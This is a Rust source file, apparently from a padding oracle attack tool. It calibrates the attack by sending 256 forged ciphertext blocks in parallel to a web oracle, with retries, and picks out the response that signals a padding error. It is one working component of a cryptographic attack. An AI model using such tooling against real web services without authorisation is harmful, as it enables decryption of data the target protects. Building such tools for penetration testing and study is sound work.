pub mod calibration_response;

use calibration_response::CalibrationResponse;

use std::{collections::HashMap, thread, time::Duration};

use anyhow::{anyhow, Context, Result};
use log::{debug, info, warn};
use rayon::iter::{IntoParallelIterator, ParallelIterator};
use reqwest::blocking::Response;
use retry::{delay::Fibonacci, retry_with_index, OperationResult};

use crate::{
    cypher_text::forged_cypher_text::ForgedCypherText,
    logging::LOG_TARGET,
    oracle::web::calibrate_web::CalibrationWebOracle,
    other::{RETRY_DELAY_MS, RETRY_MAX_ATTEMPTS},
};

pub struct Calibrator<'a> {
    forged_cypher_text: ForgedCypherText<'a>,
}

impl<'a> Calibrator<'a> {
    pub(super) fn new(forged_cypher_text: ForgedCypherText<'a>) -> Self {
        Self { forged_cypher_text }
    }

    /// Find how the web oracle responds in case of a padding error
    pub(super) fn determine_padding_error_response(
        &self,
        oracle: CalibrationWebOracle,
    ) -> Result<CalibrationResponse> {
        let responses = (u8::MIN..=u8::MAX)
            .into_par_iter()
            .map(|byte_value| {
                let mut forged_cypher_text = self.forged_cypher_text.clone();

                forged_cypher_text.set_current_byte(byte_value);
                debug!(
                    target: LOG_TARGET,
                    "Calibration block attempt: {}",
                    forged_cypher_text.forged_block_wip().to_hex()
                );

                let response =
                    retry_with_index(Fibonacci::from_millis(RETRY_DELAY_MS), |attempt| {
                        calibrate_while_handling_retries(
                            attempt,
                            byte_value,
                            &oracle,
                            &forged_cypher_text,
                        )
                    })
                    .map_err(|e| anyhow!(e.to_string()))?;

                CalibrationResponse::from_response(response, *oracle.config().consider_body())
            })
            .collect::<Result<Vec<_>>>()
            .context("Failed to contact web oracle for calibration")?;

        // false positive, the hashmap's key (`response`) is obviously not mutable
        #[allow(clippy::mutable_key_type)]
        let counted_responses = responses.into_iter().fold(
            HashMap::new(),
            |mut acc: HashMap<CalibrationResponse, usize>, response| {
                *acc.entry(response).or_default() += 1;
                acc
            },
        );
        debug!(
            target: LOG_TARGET,
            "Calibration results: {:#?}", counted_responses
        );

        if counted_responses.len() < 2 {
            return Err(anyhow!("Calibration of the web oracle failed. We don't know how a response to (in)correct padding looks, as all responses looked the same. Try adding the `--consider-body` flag"));
        }

        let padding_error_response = counted_responses
            .into_iter()
            .max_by_key(|(_, seen)| *seen)
            .map(|(response, _)| response)
            .expect("The hashmap can only be empty if no responses were received, which can only happen if errors occurred. But errors were already resolved by unpacking the potential responses.");

        info!(
            target: LOG_TARGET,
            "Calibrated the web oracle! Using parameters:"
        );
        info!(
            target: LOG_TARGET,
            "- Status: {}",
            padding_error_response.status()
        );
        if let Some(location) = padding_error_response.location() {
            info!(target: LOG_TARGET, "- Location: {}", location.to_str()?);
        }
        if *oracle.config().consider_body() {
            info!(
                target: LOG_TARGET,
                "- Content length: {}",
                padding_error_response
                    .content_length()
                    .map(|length| length.to_string())
                    .unwrap_or_else(|| "?".to_string())
            );
        }

        Ok(padding_error_response)
    }
}

fn calibrate_while_handling_retries(
    attempt: u64,
    byte_value: u8,
    oracle: &CalibrationWebOracle,
    forged_cypher_text: &ForgedCypherText,
) -> OperationResult<Response, String> {
    if attempt > RETRY_MAX_ATTEMPTS {
        return OperationResult::Err(format!(
            "Calibration block, value {}: validation failed",
            byte_value
        ));
    }

    thread::sleep(Duration::from_millis(oracle.thread_delay()));

    match oracle.ask_validation(forged_cypher_text) {
        Ok(correct_padding) => OperationResult::Ok(correct_padding),
        Err(e) => {
            warn!(
                target: LOG_TARGET,
                "Calibration block, value {}: retrying validation ({}/{})",
                byte_value,
                attempt,
                RETRY_MAX_ATTEMPTS
            );
            debug!(target: LOG_TARGET, "{:?}", e);
            OperationResult::Retry(format!(
                "Calibration block, value {}: retrying validation ({}/{})",
                byte_value, attempt, RETRY_MAX_ATTEMPTS
            ))
        }
    }
}
